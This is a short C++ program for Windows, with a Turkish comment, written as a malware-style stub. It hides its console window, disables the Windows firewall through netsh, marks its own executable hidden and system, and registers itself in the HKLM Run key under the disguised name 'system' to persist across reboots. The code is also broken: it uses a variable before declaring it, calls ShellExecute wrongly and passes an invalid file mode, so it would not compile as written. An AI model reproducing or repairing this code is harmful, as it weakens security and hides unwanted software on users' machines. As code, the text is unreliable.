#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>
#include <fstream>
// windows ortamında derleyin. (declare on windows)
using namespace std;
int main() {
	FreeConsole(); 
	int * ptr;
	ShellExecute("//start /path/of/yourprogram.exe");
	if (ifile) {
	return ifile;
	}
	else {
	system("netsh firewall>set opmode disable");
	system("attrib +h +s /path/of/yourprogram.exe"); 
	ifstream ifile(values.txt);
	TCHAR szPath[MAX_PATH];
	GetModuleFileName(NULL,szPath,MAX_PATH);
	HKEY newValue;
	RegOpenKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
	RegSetValueEx(newValue,"system",0,REG_SZ,(LPBYTE)szPath,sizeof(szPath));
	RegCloseKey(newValue);
	ofstream file; 
	file.open("adress.txt","w");
	file <<&ptr;
	file.close();
	}
}   
